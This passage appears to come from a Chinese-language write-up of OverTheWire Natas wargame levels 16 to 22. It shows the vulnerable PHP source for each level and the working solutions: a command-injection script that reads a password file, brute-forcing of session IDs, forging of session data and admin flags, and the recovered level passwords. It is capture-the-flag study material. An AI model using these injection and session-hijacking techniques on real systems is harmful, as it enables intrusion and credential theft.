charset <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
password <span class="token operator">=</span> <span class="token string">""</span>

<span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'$(grep ^</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>ch<span class="token punctuation">&#125;</span></span><span class="token string"> /etc/natas_webpass/natas17)'</span></span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> auth<span class="token operator">=</span>auth<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"needle"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"Search"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token comment"># 判断返回内容中是否包含字典内容</span>
        <span class="token keyword">if</span> <span class="token string">"African"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>  <span class="token comment"># 假设 dictionary.txt 里有 "African"</span>
            password <span class="token operator">+=</span> ch
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Found so far: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre>

<p>得到</p>
<pre class="language-none"><code class="language-none">EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC</code></pre>

<h2 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814104032653.png" alt="image-20250814104032653" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'natas17'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;censored>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'natas17'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * from users where username=\""</span><span class="token operator">.</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"debug"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Executing query: <span class="token interpolation"><span class="token variable">$query</span></span>&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//echo "This user exists.&lt;br>";</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//echo "This user doesn't exist.&lt;br>";</span>
    <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//echo "Error in query.&lt;br>";</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>延时注入，依然sqlmap</p>
<pre class="language-none"><code class="language-none">6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ</code></pre>

<h2 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814104442716.png" alt="image-20250814104442716" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$maxid</span> <span class="token operator">=</span> <span class="token number">640</span><span class="token punctuation">;</span> <span class="token comment">// 640 should be enough for everyone</span>

<span class="token keyword">function</span> <span class="token function-definition function">isValidAdminLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* &#123;&#123;&#123; */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* This method of authentication appears to be unsafe and has been disabled for now. */</span>
        <span class="token comment">//return 1;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/* &#125;&#125;&#125; */</span>
<span class="token keyword">function</span> <span class="token function-definition function">isValidID</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* &#123;&#123;&#123; */</span>
    <span class="token keyword">return</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/* &#125;&#125;&#125; */</span>
<span class="token keyword">function</span> <span class="token function-definition function">createID</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* &#123;&#123;&#123; */</span>
    <span class="token keyword">global</span> <span class="token variable">$maxid</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$maxid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/* &#125;&#125;&#125; */</span>
<span class="token keyword">function</span> <span class="token function-definition function">debug</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* &#123;&#123;&#123; */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"debug"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">print</span> <span class="token string double-quoted-string">"DEBUG: <span class="token interpolation"><span class="token variable">$msg</span></span>&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/* &#125;&#125;&#125; */</span>
<span class="token keyword">function</span> <span class="token function-definition function">my_session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* &#123;&#123;&#123; */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PHPSESSID"</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isValidID</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PHPSESSID"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">debug</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Session start failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">debug</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Session start ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">debug</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Session was old: admin flag set"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// backwards compatible, secure</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/* &#125;&#125;&#125; */</span>
<span class="token keyword">function</span> <span class="token function-definition function">print_credentials</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* &#123;&#123;&#123; */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span> <span class="token keyword">and</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"You are an admin. The credentials for the next level are:&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"&lt;pre>Username: natas19\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"Password: &lt;censored>&lt;/pre>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/* &#125;&#125;&#125; */</span>

<span class="token variable">$showform</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">my_session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">print_credentials</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$showform</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">createID</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">isValidAdminLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">debug</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"New session started"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$showform</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token function">print_credentials</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$showform</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>会话id可以爆破</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814104722256.png" alt="image-20250814104722256" loading="lazy"></p>
<pre class="language-none"><code class="language-none">Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</code></pre>

<h2 id="Level-19"><a href="#Level-19" class="headerlink" title="Level 19"></a>Level 19</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814104759052.png" alt="image-20250814104759052" loading="lazy"></p>
<p>session变成了数字-admin 然后hex形式</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://natas19.natas.labs.overthewire.org/index.php"</span>
auth <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"natas19"</span><span class="token punctuation">,</span> <span class="token string">"tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"</span><span class="token punctuation">)</span>  <span class="token comment"># Replace with target creds</span>

<span class="token keyword">for</span> session_id <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">641</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    formatted_session_id <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>session_id<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'-admin'</span>
    encoded_session_id <span class="token operator">=</span> formatted_session_id<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Current cookie: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>encoded_session_id<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>encoded_session_id<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> auth<span class="token operator">=</span>auth<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> <span class="token string">"You are an admin"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Admin session found! PHPSESSID=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>session_id<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">break</span></code></pre>

<pre class="language-none"><code class="language-none">p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</code></pre>

<h2 id="Level-20"><a href="#Level-20" class="headerlink" title="Level 20"></a>Level 20</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814105401261.png" alt="image-20250814105401261" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">print_credentials</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* &#123;&#123;&#123; */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span> <span class="token keyword">and</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"You are an admin. The credentials for the next level are:&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"&lt;pre>Username: natas21\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"Password: &lt;censored>&lt;/pre>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"You are logged in as a regular user. Login as an admin to retrieve credentials for natas21."</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>session里面的admin为1即可</p>
<p>session是文件形式存储，按键值对存在，以空格分隔</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;natas20.natas.labs.overthewire.org&#x2F;index.php?name&#x3D;admin%0Aadmin%201&amp;debug&#x3D;1</code></pre>



<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814110151443.png" alt="image-20250814110151443" loading="lazy"></p>
<pre class="language-none"><code class="language-none">BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</code></pre>

<h2 id="Level-21"><a href="#Level-21" class="headerlink" title="Level 21"></a>Level 21</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814110405229.png" alt="image-20250814110405229" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814112450619.png" alt="image-20250814112450619" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// if update was submitted, store it</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"submit"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"debug"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"[DEBUG] Session contents:&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// only allow these keys</span>
<span class="token variable">$validkeys</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"align"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"center"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"fontsize"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"100%"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"bgcolor"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"yellow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$form</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token variable">$form</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;form action="index.php" method="POST">'</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$validkeys</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$defval</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token variable">$defval</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$form</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$key</span></span>: &lt;input name='<span class="token interpolation"><span class="token variable">$key</span></span>' value='<span class="token interpolation"><span class="token variable">$val</span></span>' />&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$form</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;input type="submit" name="submit" value="Update" />'</span><span class="token punctuation">;</span>
<span class="token variable">$form</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/form>'</span><span class="token punctuation">;</span>

<span class="token variable">$style</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"background-color: "</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"bgcolor"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"; text-align: "</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"align"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"; font-size: "</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"fontsize"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>
<span class="token variable">$example</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;div style='<span class="token interpolation"><span class="token variable">$style</span></span>'>Hello world!&lt;/div>"</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>可以注入会话,修改第二个站session的admin为1，影响第一个站</p>
<pre class="language-php" data-language="php"><code class="language-php">curl <span class="token operator">-</span><span class="token constant">X</span> <span class="token constant">POST</span> <span class="token operator">-</span>u <span class="token string single-quoted-string">'natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH'</span> <span class="token operator">-</span>v <span class="token string single-quoted-string">'http://natas21-experimenter.natas.labs.overthewire.org/?debug=1'</span> <span class="token operator">-</span>b <span class="token string single-quoted-string">'PHPSESSID=413e96uk941o14rn1jb52ak29m'</span> <span class="token operator">-</span>d <span class="token string single-quoted-string">'align=center&amp;fontsize=100%25&amp;bgcolor=yellow&amp;admin=1&amp;submit=Update'</span>

curl <span class="token operator">-</span>u <span class="token string single-quoted-string">'natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH'</span> <span class="token operator">-</span>v <span class="token string single-quoted-string">'http://natas21.natas.labs.overthewire.org/'</span> <span class="token operator">-</span>b <span class="token string single-quoted-string">'PHPSESSID=413e96uk941o14rn1jb52ak29m'</span></code></pre>

<pre class="language-none"><code class="language-none">Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</code></pre>



<h2 id="Level-22"><a href="#Level-22" class="headerlink" title="Level 22"></a>Level 22</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814152409489.png" alt="image-20250814152409489" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"revelio"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// only admins can reveal the password</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span> <span class="token keyword">and</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>


<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
